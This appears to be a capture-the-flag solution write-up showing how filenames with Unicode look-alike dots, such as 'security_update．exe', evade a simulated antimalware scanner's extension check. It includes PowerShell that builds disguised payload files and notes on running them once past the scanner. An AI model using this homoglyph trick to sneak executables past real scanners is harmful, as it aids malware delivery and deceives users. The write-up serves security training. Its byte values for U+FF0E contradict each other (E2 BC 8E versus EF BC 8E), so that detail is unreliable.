---
title: "Solution 26: Fullwidth Period (U+FF0E) Extension Spoofing"
challenge_number: 26
difficulty: hard
category: "Extension Heuristic Bypass"
permalink: /solutions/26-fullwidth-dot/
---

# Solution: Fullwidth Period (U+FF0E) Extension Spoofing

[Back to Challenge](../challenges/26-fullwidth-dot.md)

## Overview

The scanner uses `rfind('.')` to locate the extension separator, searching specifically for ASCII period (byte 0x2E). The Unicode fullwidth period U+FF0E **looks identical** to a regular period in many fonts but is encoded as completely different bytes (E2 BC 8E in UTF-8, or FF 0E in UTF-16). The scanner fails to find any dot, treats the entire filename as having no extension, and produces no warning.

## Working Code

### Basic Fullwidth Period File

```powershell
# U+FF0E is the fullwidth period (．)
$fwdot = [char]0xFF0E

# Create "malware．exe" — visually looks like "malware.exe"
# But the scanner sees no ASCII dot, so extension = ""
$name = "malware${fwdot}exe"
New-Item -Path $name -ItemType File -Force
Set-Content -Path $name -Value "payload content here"

Write-Host "Filename: $name"
Write-Host "Contains ASCII dot: $($name.Contains('.'))"  # False!
```

### Demonstrating the Scanner's Blindness

```powershell
$fwdot = [char]0xFF0E

# These all LOOK like they have extensions but have NO ASCII dot:
$files = @(
    "payload${fwdot}exe",
    "trojan${fwdot}bat",
    "keylogger${fwdot}ps1",
    "dropper${fwdot}vbs",
    "backdoor${fwdot}scr"
)

foreach ($f in $files) {
    Set-Content -Path $f -Value "test"
    $hasDot = $f.IndexOf('.') -ne -1
    Write-Host "File: $f | Has ASCII dot: $hasDot | Extension per scanner: (none)"
}
```

### Byte-Level Proof

```powershell
$fwdot = [char]0xFF0E
$name = "test${fwdot}exe"

# Show UTF-8 bytes
$utf8bytes = [System.Text.Encoding]::UTF8.GetBytes($name)
Write-Host "UTF-8 bytes:"
Write-Host ($utf8bytes | ForEach-Object { "0x{0:X2}" -f $_ }) -Separator " "
# Output: 0x74 0x65 0x73 0x74 0xEF 0xBC 0x8E 0x65 0x78 0x65
#          t    e    s    t    [fullwidth dot]   e    x    e

# Show there's no 0x2E (ASCII period) anywhere
$hasAsciiDot = $utf8bytes -contains 0x2E
Write-Host "Contains 0x2E (ASCII dot): $hasAsciiDot"  # False

# Compare with normal dot
$normalName = "test.exe"
$normalBytes = [System.Text.Encoding]::UTF8.GetBytes($normalName)
Write-Host "`nNormal 'test.exe' UTF-8 bytes:"
Write-Host ($normalBytes | ForEach-Object { "0x{0:X2}" -f $_ }) -Separator " "
# Output: 0x74 0x65 0x73 0x74 0x2E 0x65 0x78 0x65
#          t    e    s    t    .    e    x    e
```

### Other Unicode Dot Variants

```powershell
# Multiple Unicode characters that look like periods:
$dots = @{
    "U+FF0E Fullwidth"   = [char]0xFF0E  # ．
    "U+2024 One Dot Leader" = [char]0x2024  # ․
    "U+FE52 Small Period"   = [char]0xFE52  # ﹒
    "U+0701 Syriac Sublinear" = [char]0x0701  # ܁
}

foreach ($entry in $dots.GetEnumerator()) {
    $name = "payload$($entry.Value)exe"
    $hasAsciiDot = $name.Contains('.')
    Write-Host "$($entry.Key): '$name' | ASCII dot present: $hasAsciiDot"
}
```

### Practical Attack Scenario

```powershell
$fwdot = [char]0xFF0E

# Create a convincing payload
$payloadName = "security_update${fwdot}exe"

# Write actual PE content (or script content)
# For demo, write a batch-like payload
@"
@echo off
echo Security update installed successfully
whoami > %TEMP%\exfil.txt
"@ | Set-Content $payloadName

Write-Host "Created: $payloadName"
Write-Host "In Explorer/terminals this may display as: security_update.exe"
Write-Host "Scanner sees: 'security_update．exe' with no valid extension"
```

## Why It Works

The scanner's extension extraction in pseudocode:

```nim
proc getExtension(filename: string): string =
    let dotPos = filename.rfind('.')   # Searches for BYTE 0x2E only
    if dotPos == -1:
        return ""                       # No ASCII dot found
    return filename[dotPos+1..^1].toLowerAscii()
```

When the filename is `payload．exe` (with U+FF0E):

1. `rfind('.')` searches for byte 0x2E in the string
2. The fullwidth period is bytes `EF BC 8E` in UTF-8 — none of which are 0x2E
3. `rfind` returns -1 (not found)
4. Extension is set to `""` (empty string)
5. Empty string is not in the suspicious list → **no warning**

The fundamental flaw: The scanner assumes the dot separator will always be ASCII 0x2E. It has no awareness of Unicode homoglyphs — characters that look identical but have different code points.

### Visual Comparison

```
ASCII Period:     .  (U+002E, 1 byte:  0x2E)
Fullwidth Period: ．(U+FF0E, 3 bytes: 0xEF 0xBC 0x8E)

In most monospace fonts, these are indistinguishable.
```

## How to Verify

1. Create a file with fullwidth period:
   ```powershell
   $fwdot = [char]0xFF0E
   $testfile = "scantest${fwdot}exe"
   Set-Content -Path $testfile -Value "test payload"
   ```

2. Run the scanner:
   ```
   nim_antimalware_sim.exe scantest．exe
   ```

3. Expected result: **No extension warning** — the scanner finds no ASCII dot, extracts empty extension, no match against suspicious list.

4. Prove the ASCII dot is missing:
   ```powershell
   $fwdot = [char]0xFF0E
   $testfile = "scantest${fwdot}exe"
   # Simulate what the scanner does
   $dotPos = $testfile.IndexOf('.')
   Write-Host "rfind('.') result: $dotPos"  # -1
   Write-Host "Extension would be: (empty string)"
   ```

5. Compare with real ASCII dot:
   ```powershell
   Set-Content -Path "scantest.exe" -Value "test payload"
   nim_antimalware_sim.exe scantest.exe
   ```
   This produces the `.exe` extension warning.

6. Note on execution: Files with fullwidth dots may not execute directly via double-click (Windows uses the real extension for file association). Execution requires explicit invocation:
   ```powershell
   cmd /c "scantest．exe"
   # Or rename after passing the scanner
   ```
